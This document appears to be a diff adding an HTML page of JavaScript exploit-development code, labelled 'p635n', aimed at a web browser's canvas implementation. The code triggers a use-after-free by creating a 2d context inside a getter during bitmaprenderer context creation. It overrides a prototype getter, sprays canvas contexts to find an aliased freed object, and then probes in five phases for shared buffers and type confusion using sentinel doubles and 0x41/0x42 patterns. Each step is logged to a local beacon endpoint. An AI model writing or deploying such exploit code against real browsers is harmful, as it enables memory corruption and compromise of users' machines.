@@ -1,0 +1,348 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635n</title></head>
+<body><pre id="out">p635n: bmr+alias overlap — cross-context data channel</pre>
+<script>
+'use strict';
+/*
+  p635n: Test if bmr ImageBuffer and 2d alias share canvas backing
+  -- prior art: p635m confirmed tfib(bitmap) SURVIVES (m_canvas valid)
+  -- prior art: p635m confirmed getter override works (configurable)
+  -- prior art: p635d confirmed 13 double + 8 string R/W via alias
+
+  CRASH_CLASS: LOW — no bmr.canvas access, tfib confirmed safe
+
+  Strategy:
+  A) Transfer bitmap via bmr, read pixels through 2d alias (getImageData)
+     If pixels match: bmr and 2d SHARE the canvas backing buffer!
+  B) Draw through 2d alias (fillRect), read back via canvas.toDataURL
+     If bitmap content changes: 2d writes go through to bmr buffer!
+  C) Write f64 pattern via alias transform, read pixels via toDataURL
+     If transform doubles appear in pixel data: memory overlap!
+  D) Transfer large bitmap, read doubles through alias
+     If doubles changed from spray values: bmr buffer overlaps alias state!
+  E) Spray-controlled ImageBitmap: create bitmap with pointer-sized patterns,
+     transfer to bmr, read through alias doubles for type confusion
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635N-' + tag + (d !== undefined ? '-' + String(d).slice(0,500) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635n', msg:msg, level:'info', sid:'p635n-'+Date.now()}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+function f64hex(v) {
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var u = new Uint32Array(buf);
+  return ((u[1]>>>0).toString(16)).padStart(8,'0') + ((u[0]>>>0).toString(16)).padStart(8,'0');
+}
+
+bk('START', navigator.userAgent);
+
+// Override bmr.canvas getter globally so tfib never crashes
+var bmrProto = null;
+var origCanvasDesc = null;
+function patchGetter() {
+  if (!bmrProto) {
+    var tmp = document.createElement('canvas');
+    tmp.width=1; tmp.height=1;
+    var tmpBmr = tmp.getContext('bitmaprenderer');
+    bmrProto = Object.getPrototypeOf(tmpBmr);
+    origCanvasDesc = Object.getOwnPropertyDescriptor(bmrProto, 'canvas');
+  }
+  Object.defineProperty(bmrProto, 'canvas', {
+    get: function() { return this._fakeCanvas || null; },
+    configurable: true
+  });
+}
+function unpatchGetter() {
+  if (origCanvasDesc) Object.defineProperty(bmrProto, 'canvas', origCanvasDesc);
+}
+
+function triggerUAF() {
+  var cv = document.createElement('canvas');
+  cv.width = 64; cv.height = 64;
+  var inner = null, bmr = null;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  patchGetter();
+  bmr = cv.getContext('bitmaprenderer', opts);
+  if (bmr) bmr._fakeCanvas = cv;
+  // Spray for alias
+  var spray = [];
+  for (var i = 0; i < 40; i++) {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    spray.push(c.getContext('2d'));
+  }
+  var alias = null, idx = -1;
+  var SENT = 77777.5;
+  try { inner.lineWidth = SENT; } catch(e) { return null; }
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].lineWidth === SENT) { alias = spray[i]; idx = i; break; }
+  }
+  return {cv:cv, inner:inner, bmr:bmr, alias:alias, idx:idx, spray:spray};
+}
+
+// Helper: create a bitmap with a specific RGBA fill
+function makeBitmap(w, h, r, g, b, a) {
+  var c = document.createElement('canvas');
+  c.width = w; c.height = h;
+  var ctx = c.getContext('2d');
+  ctx.fillStyle = 'rgba('+r+','+g+','+b+','+(a/255)+')';
+  ctx.fillRect(0, 0, w, h);
+  return createImageBitmap(c, 0, 0, w, h);
+}
+
+// ================================================================
+// PHASE A: Transfer bitmap via bmr, read pixels through 2d alias
+// ================================================================
+bk('A-START', 'bmr write → alias read');
+var uafA = triggerUAF();
+bk('A-ALIAS', uafA && uafA.alias ? 'spray['+uafA.idx+']' : 'NONE');
+
+if (uafA && uafA.alias && uafA.bmr) {
+  // Read pixels through alias BEFORE transfer
+  try {
+    var pxPre = uafA.inner.getImageData(0, 0, 4, 4);
+    var preSum = 0;
+    for (var i = 0; i < pxPre.data.length; i++) preSum += pxPre.data[i];
+    bk('A-PRE-PIX', 'sum='+preSum+' px0='+pxPre.data[0]+','+pxPre.data[1]+','+pxPre.data[2]+','+pxPre.data[3]);
+  } catch(e) { bk('A-PRE-PIX', 'ERR:'+e.message.slice(0,40)); }
+
+  // Transfer a magenta bitmap via bmr
+  makeBitmap(64, 64, 255, 0, 255, 255).then(function(bmp) {
+    try {
+      uafA.bmr.transferFromImageBitmap(bmp);
+      bk('A-TFIB', 'transferred 255,0,255');
+    } catch(e) { bk('A-TFIB', 'ERR:'+e.message.slice(0,40)); return; }
+
+    // Read pixels through 2d alias (inner) AFTER transfer
+    try {
+      var pxPost = uafA.inner.getImageData(0, 0, 4, 4);
+      bk('A-POST-PIX', 'px0='+pxPost.data[0]+','+pxPost.data[1]+','+pxPost.data[2]+','+pxPost.data[3]);
+      var match = (pxPost.data[0]===255 && pxPost.data[1]===0 && pxPost.data[2]===255);
+      bk('A-OVERLAP', match ? 'YES-SHARED-BUFFER!' : 'no-different-buffers');
+    } catch(e) { bk('A-POST-PIX', 'ERR:'+e.message.slice(0,40)); }
+
+    // Also read via canvas.toDataURL to compare
+    try {
+      var url = uafA.cv.toDataURL();
+      bk('A-URL', 'len='+url.length);
+    } catch(e) {}
+
+    continueB();
+  }).catch(function(e) { bk('A-BMP-ERR', e.message.slice(0,40)); continueB(); });
+} else {
+  bk('A-SKIP', 'no alias or bmr');
+  continueB();
+}
+
+function continueB() {
+
+// ================================================================
+// PHASE B: Draw through 2d alias, read back via toDataURL
+// ================================================================
+bk('B-START', 'alias write → bmr read');
+var uafB = triggerUAF();
+if (uafB && uafB.alias && uafB.bmr) {
+  bk('B-ALIAS', 'spray['+uafB.idx+']');
+
+  // First transfer a cyan bitmap so bmr has known content
+  makeBitmap(64, 64, 0, 255, 255, 255).then(function(bmpB) {
+    uafB.bmr.transferFromImageBitmap(bmpB);
+    bk('B-TFIB', 'transferred cyan');
+
+    // Read toDataURL — should be cyan
+    var urlPre = uafB.cv.toDataURL();
+    bk('B-PRE-URL', 'len='+urlPre.length);
+
+    // Draw RED through 2d alias
+    uafB.alias.fillStyle = '#ff0000';
+    uafB.alias.fillRect(0, 0, 64, 64);
+
+    // Read toDataURL — if red, 2d writes go to same buffer
+    var urlPost = uafB.cv.toDataURL();
+    bk('B-POST-URL', 'len='+urlPost.length+' same='+(urlPre===urlPost));
+
+    // Read pixels via createImageBitmap to check actual content
+    createImageBitmap(uafB.cv, 0, 0, 4, 4).then(function(bmpRead) {
+      var rc = document.createElement('canvas');
+      rc.width = 4; rc.height = 4;
+      var rctx = rc.getContext('2d');
+      rctx.drawImage(bmpRead, 0, 0);
+      var px = rctx.getImageData(0, 0, 4, 4);
+      bk('B-CONTENT', 'px0='+px.data[0]+','+px.data[1]+','+px.data[2]+','+px.data[3]);
+      var isRed = (px.data[0]===255 && px.data[1]===0 && px.data[2]===0);
+      var isCyan = (px.data[0]===0 && px.data[1]===255 && px.data[2]===255);
+      bk('B-RESULT', isRed ? 'ALIAS-WRITES-TO-BMR-BUFFER!' : (isCyan ? 'separate-buffers(still cyan)' : 'unknown:'+px.data[0]+','+px.data[1]+','+px.data[2]));
+      bmpRead.close();
+      continueC();
+    }).catch(function(e) { bk('B-READ-ERR', e.message.slice(0,40)); continueC(); });
+  }).catch(function(e) { bk('B-BMP-ERR', e.message.slice(0,40)); continueC(); });
+} else {
+  bk('B-SKIP', 'no alias or bmr');
+  continueC();
+}
+}
+
+function continueC() {
+
+// ================================================================
+// PHASE C: Write doubles via alias, check if they appear in pixel data
+// ================================================================
+bk('C-START', 'alias doubles → pixel readback');
+var uafC = triggerUAF();
+if (uafC && uafC.alias && uafC.bmr) {
+  // Set distinctive double patterns via alias
+  uafC.alias.lineWidth = 1.7976931348623157e+308; // DBL_MAX
+  uafC.alias.miterLimit = 5e-324; // DBL_MIN
+  uafC.alias.globalAlpha = 0.123456789;
+  var tx = uafC.alias;
+  tx.setTransform(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
+
+  // Transfer a 1x1 bitmap to make bmr active
+  makeBitmap(64, 64, 128, 128, 128, 255).then(function(bmpC) {
+    uafC.bmr.transferFromImageBitmap(bmpC);
+
+    // Read all pixels and scan for our doubles as f64
+    createImageBitmap(uafC.cv, 0, 0, 64, 64).then(function(bmpRead) {
+      var rc = document.createElement('canvas');
+      rc.width = 64; rc.height = 64;
+      var rctx = rc.getContext('2d');
+      rctx.drawImage(bmpRead, 0, 0);
+      var px = rctx.getImageData(0, 0, 64, 64);
+      var fv = new Float64Array(px.data.buffer);
+
+      // Check for our sentinel doubles
+      var found = [];
+      for (var i = 0; i < fv.length; i++) {
+        if (fv[i] === 1.7976931348623157e+308) found.push('['+i+']=DBL_MAX');
+        if (fv[i] === 5e-324) found.push('['+i+']=DBL_MIN');
+        if (Math.abs(fv[i] - 1.1) < 0.001) found.push('['+i+']=tx.a');
+        if (Math.abs(fv[i] - 4.4) < 0.001) found.push('['+i+']=tx.d');
+      }
+      bk('C-DOUBLES', found.length > 0 ? 'FOUND: '+found.join(' ') : 'none-in-pixels');
+      bmpRead.close();
+      continueD();
+    }).catch(function(e) { bk('C-READ-ERR', e.message.slice(0,40)); continueD(); });
+  }).catch(function(e) { bk('C-BMP-ERR', e.message.slice(0,40)); continueD(); });
+} else { continueD(); }
+}
+
+function continueD() {
+
+// ================================================================
+// PHASE D: Transfer bitmap, read doubles through alias
+// ================================================================
+bk('D-START', 'bmr bitmap → alias doubles');
+var uafD = triggerUAF();
+if (uafD && uafD.alias && uafD.bmr) {
+  // Record alias doubles BEFORE transfer
+  var preLW = uafD.inner.lineWidth;
+  var preML = uafD.inner.miterLimit;
+  var preGA = uafD.inner.globalAlpha;
+  var preT = uafD.inner.getTransform();
+  bk('D-PRE', 'lw='+f64hex(preLW)+' ml='+f64hex(preML)+' ga='+f64hex(preGA));
+
+  // Transfer a bitmap with specific byte pattern
+  var patternCanvas = document.createElement('canvas');
+  patternCanvas.width = 64; patternCanvas.height = 64;
+  var pctx = patternCanvas.getContext('2d');
+  // Write pixel data that encodes f64 values
+  var id = pctx.createImageData(64, 64);
+  for (var i = 0; i < id.data.length; i += 8) {
+    // Write 0x4141414142424242 as two pixels (RGBA RGBA)
+    id.data[i+0]=0x42; id.data[i+1]=0x42; id.data[i+2]=0x42; id.data[i+3]=0x42;
+    id.data[i+4]=0x41; id.data[i+5]=0x41; id.data[i+6]=0x41; id.data[i+7]=0x41;
+  }
+  pctx.putImageData(id, 0, 0);
+
+  createImageBitmap(patternCanvas, 0, 0, 64, 64).then(function(bmpD) {
+    uafD.bmr.transferFromImageBitmap(bmpD);
+    bk('D-TFIB', 'transferred 0x41/0x42 pattern');
+
+    // Read alias doubles AFTER transfer
+    try {
+      var postLW = uafD.inner.lineWidth;
+      var postML = uafD.inner.miterLimit;
+      var postGA = uafD.inner.globalAlpha;
+      var postT = uafD.inner.getTransform();
+      bk('D-POST', 'lw='+f64hex(postLW)+' ml='+f64hex(postML)+' ga='+f64hex(postGA));
+
+      if (postLW !== preLW) bk('D-LW-CHANGED', f64hex(preLW)+'->'+f64hex(postLW));
+      if (postML !== preML) bk('D-ML-CHANGED', f64hex(preML)+'->'+f64hex(postML));
+      if (postGA !== preGA) bk('D-GA-CHANGED', f64hex(preGA)+'->'+f64hex(postGA));
+
+      // Check transform
+      if (postT.a !== preT.a) bk('D-TX-A', f64hex(preT.a)+'->'+f64hex(postT.a));
+      if (postT.e !== preT.e) bk('D-TX-E', f64hex(preT.e)+'->'+f64hex(postT.e));
+
+      // Check ALL doubles for our 0x41/0x42 pattern
+      var ab = new ArrayBuffer(8);
+      var view = new DataView(ab);
+      view.setUint32(0, 0x42424242, false);
+      view.setUint32(4, 0x41414141, false);
+      var sentinel = new Float64Array(ab)[0];
+      bk('D-SENTINEL', f64hex(sentinel));
+
+      if (postLW === sentinel) bk('D-HIT-LW', 'OVERLAP!');
+      if (postML === sentinel) bk('D-HIT-ML', 'OVERLAP!');
+    } catch(e) { bk('D-POST', 'ERR:'+e.message.slice(0,60)); }
+
+    continueE();
+  }).catch(function(e) { bk('D-BMP-ERR', e.message.slice(0,40)); continueE(); });
+} else { continueE(); }
+}
+
+function continueE() {
+
+// ================================================================
+// PHASE E: Multiple transfers + free — check for stale buffer
+// ================================================================
+bk('E-START', 'multi-transfer stale buffer');
+var uafE = triggerUAF();
+if (uafE && uafE.bmr) {
+  // Transfer bitmap 1
+  makeBitmap(64, 64, 0xDE, 0xAD, 0xBE, 0xFF).then(function(b1) {
+    uafE.bmr.transferFromImageBitmap(b1);
+    bk('E-T1', 'transferred DEADBE');
+
+    // Transfer null (clear buffer)
+    uafE.bmr.transferFromImageBitmap(null);
+    bk('E-T-NULL', 'cleared buffer');
+
+    // Read back — should be empty, but might have stale DEADBE
+    createImageBitmap(uafE.cv, 0, 0, 4, 4).then(function(bmpE) {
+      var rc = document.createElement('canvas');
+      rc.width = 4; rc.height = 4;
+      var rctx = rc.getContext('2d');
+      rctx.drawImage(bmpE, 0, 0);
+      var px = rctx.getImageData(0, 0, 4, 4);
+      bk('E-AFTER-NULL', 'px0='+px.data[0]+','+px.data[1]+','+px.data[2]+','+px.data[3]);
+      var isDE = (px.data[0] === 0xDE);
+      bk('E-STALE', isDE ? 'STALE-DATA-AFTER-NULL!' : 'clean('+px.data[0]+')');
+      bmpE.close();
+
+      bk('E-DONE', 'survived');
+      bk('DONE', 'all phases complete');
+      unpatchGetter();
+    }).catch(function(e) { bk('E-RD-ERR', e.message.slice(0,40)); bk('DONE','err'); unpatchGetter(); });
+  }).catch(function(e) { bk('E-ERR', e.message.slice(0,40)); bk('DONE','err'); unpatchGetter(); });
+} else { bk('DONE','no bmr'); unpatchGetter(); }
+}
+
+</script>
+</body></html>
